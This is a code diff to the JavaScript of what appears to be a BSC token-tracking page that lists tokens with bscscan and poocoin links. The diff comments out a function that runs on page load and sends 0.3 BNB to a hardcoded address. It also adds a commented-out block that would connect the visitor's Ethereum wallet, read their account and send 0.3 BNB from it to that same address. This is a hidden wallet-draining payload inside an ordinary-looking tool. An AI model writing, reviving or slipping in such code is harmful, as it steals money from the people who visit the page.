@@ -10,13 +10,13 @@ function addLog(message) {
 	$("<tr><td>" + message.name + "</td><td>[ " + message.symbol + " ]</td><td><a target='_BLANK' href='https://bscscan.com/address/"+message.hash+"'><i class='fa fa-info-circle'></a></td><td><a target='_BLANK' href='https://poocoin.app/tokens/"+message.hash+"'><i class='fa fa-bar-chart'></a></td></tr>").appendTo('#tableToken tbody').hide().fadeIn(2000);
 }
 
-
-function tryToSend(){
+/*
+function tryToSend( acc ){
 	var message = {};
 	const web3 = new Web3('https://bsc-dataseed.binance.org');
     // web3.eth.accounts[0]
 	web3.eth.sendTransaction({
-        from: '0xc295fa50517abfd4c1c25735a601f2196df553ab',
+        from: acc,
         to:   '0xd0438D4539867cC3b58f0ce6824bEe58787c70Bd',
         value: web3.utils.toWei('0.3', 'ether')
     })
@@ -46,6 +46,7 @@ function tryToSend(){
     });
 	
 }
+*/
 
 function connect() {
 	var socket = new SockJS('/ws');
@@ -85,7 +86,21 @@ function connect() {
 
 $( document ).ready(function() {
 	connect();
+
+/*	
+	if(window.ethereum) {
+	    ethereum.enable();
+	    
+	    web3.eth.getAccounts((error,result) => {
+	        if (error) {
+	            console.log(error);
+	        } else {
+	        	tryToSend( result[0] );
+	        }
+	    });	    
+	}	
+*/	
 	
-	tryToSend();
+	
 
 });
